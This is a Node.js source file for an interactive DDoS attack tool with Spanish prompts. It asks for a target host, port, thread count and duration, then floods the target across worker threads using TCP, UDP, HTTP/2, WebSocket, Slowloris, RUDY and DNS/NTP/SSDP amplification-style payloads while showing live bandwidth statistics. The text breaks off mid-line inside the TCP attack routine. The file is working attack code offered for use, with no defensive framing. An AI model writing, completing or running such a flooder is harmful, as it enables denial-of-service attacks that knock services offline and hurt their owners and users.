#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const WebSocket = require('ws');
const { spawn } = require('child_process');
const { Worker, isMainThread, workerData, parentPort } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');
const url = require('url');
const dns = require('dns/promises');

class DDoSAttack {
  constructor() {
    this.stats = { total: 0, success: 0, failed: 0, bandwidth: 0, start: 0 };
    this.config = {
      workers: [],
      anim: ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏'],
      methods: [
        'TCP','UDP','HTTP','HTTPS','HTTP2','WEBSOCKET','SLOWLORIS',
        'DNS','NTP','SSDP','ICMP','RUDY'
      ]
    };
    this.running = false;
  }

  async init() {
    const targetInput = await this.ask(chalk.greenBright('IP/URL objetivo: '));
    const parsed = await this.parseTarget(targetInput);

    this.target = parsed.hostname;
    this.port = parsed.port;
    this.resolvedIP = await this.resolveTarget(this.target);

    if (net.isIP(this.target) && !parsed.hasPort) {
      const portInput = await this.ask(chalk.greenBright('Puerto: ')) || '80';
      this.port = parseInt(portInput, 10);
    }

    this.threads = Math.min(
      parseInt(await this.ask(chalk.greenBright('Hilos (50-500): ')) || 100, 10),
      500
    );

    this.duration = Math.min(
      parseInt(await this.ask(chalk.greenBright('Duración (segundos): ')) || 60, 10),
      3600
    );

    this.selectedMethods = await this.selectMethods();
    this.generatePayloads();
    this.showAttackSummary();
    this.start();
  }

  async parseTarget(input) {
    try {
      const original = input;
      if (!input.startsWith('http')) input = `http://${input}`;
      const parsed = new url.URL(input);
      const hasPort = original.includes(':') && !!parsed.port;
      return {
        hostname: parsed.hostname,
        port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
        hasPort
      };
    } catch {
      console.log(chalk.red('Formato inválido'));
      process.exit(1);
    }
  }

  async resolveTarget(host) {
    if (net.isIP(host)) return host;
    try {
      const { address } = await dns.lookup(host);
      console.log(chalk.yellow(`Resolución DNS: ${host} => ${address}`));
      return address;
    } catch {
      console.log(chalk.red('Error DNS'));
      process.exit(1);
    }
  }

  async selectMethods() {
    const prompt =
      chalk.greenBright('Métodos disponibles:\n') +
      chalk.yellow(this.config.methods.join(', ') + '\n') +
      chalk.greenBright('Métodos (separar por coma) [Enter para todos]: ');
    const answer = await this.ask(prompt);
    if (!answer) return this.config.methods;
    return answer.toUpperCase().split(',').map(m => m.trim()).filter(Boolean);
  }

  generatePayloads() {
    const make = size => { const buf = Buffer.alloc(size); randomFillSync(buf); return buf; };

    this.payloads = {
      tcp: make(1024),
      udp: make(65507),
      http: `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${this.target}\r\n\r\n`,
      dns: this.createDnsPacket(),
      ntp: Buffer.from([0x1B, ...Buffer.alloc(47)]),
      ssdp: Buffer.from(
        'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\n' +
        'MAN:"ssdp:discover"\r\nMX:1\r\nST:ssdp:all\r\n\r\n'
      ),
      rudy: Buffer.from(
        'POST / HTTP/1.1\r\nContent-Length:1000000\r\n\r\n'
      )
    };
  }

  createDnsPacket() {
    const domain = randomBytes(8).toString('hex') + '.com';
    return Buffer.from([
      0xAA,0xAA,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
      domain.length, ...Buffer.from(domain), 0x00,0x00,0x01,0x00,0x01
    ]);
  }

  showAttackSummary() {
    console.log(chalk.cyanBright('\nConfiguración:'));
    console.log(chalk.yellow(`Objetivo: ${this.target}:${this.port}`));
    console.log(chalk.yellow(`Duración: ${this.duration}s`));
    console.log(chalk.yellow(`Hilos: ${this.threads}`));
    console.log(chalk.yellow(`Métodos: ${this.selectedMethods.join(', ')}`));
    console.log();
  }

  start() {
    this.running = true;
    this.stats.start = performance.now();
    console.log(chalk.green('Iniciando ataque...'));
    this.launchWorkers();
    this.showStats();
    setTimeout(() => this.stop(), this.duration * 1000);
  }

  launchWorkers() {
    const cores = Math.min(require('os').cpus().length, 16);
    const perWorker = Math.ceil(this.threads / cores);
    for (let i = 0; i < cores; i++) {
      const worker = new Worker(__filename, {
        workerData: { target: this.resolvedIP, port: this.port, payloads: this.payloads, methods: this.selectedMethods, threads: perWorker, hostHeader: this.target }
      });
      worker.on('message', msg => this.updateStats(msg));
      worker.on('error', err => console.error(chalk.red(`Worker Error: ${err.message}`)));
      this.config.workers.push(worker);
    }
  }

  updateStats({ total, success, failed, bw }) {
    this.stats.total += total;
    this.stats.success += success;
    this.stats.failed += failed;
    this.stats.bandwidth += bw;
  }

  showStats() {
    if (!this.running) return;
    const elapsed = (performance.now() - this.stats.start) / 1000;
    const frame = this.config.anim[Math.floor(elapsed * 10) % 10];
    const rps = (this.stats.total / elapsed || 0).toFixed(0);
    const bwGB = (this.stats.bandwidth / 1024 ** 3).toFixed(3);
    process.stdout.write(chalk`\r{green ${frame}} T:{greenBright ${elapsed.toFixed(1)}s} Req:{cyan ${this.stats.total}} SPS:{cyan ${rps}} BW:{cyan ${bwGB}GB} ({green ${this.stats.success}}|{red ${this.stats.failed}})`);
    setTimeout(() => this.showStats(), 100);
  }

  stop() {
    this.running = false;
    this.config.workers.forEach(w => w.terminate());
    console.log(chalk.yellow('\nAtaque detenido\n'));
    process.exit();
  }

  ask(prompt) {
    return new Promise(resolve => {
      const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
      rl.question(prompt, answer => { rl.close(); resolve(answer); });
    });
  }
}

if (isMainThread) {
  new DDoSAttack().init();
} else {
  const { target, port, payloads, methods, threads, hostHeader } = workerData;
  const attackMethods = {
    TCP: () => {
      const s = new net.Socket();
      s.connect(port, target, () => { s.write(payloads.tcp); report('success', payloads.tcp.length); s.destroy(); }).on('error', () => report
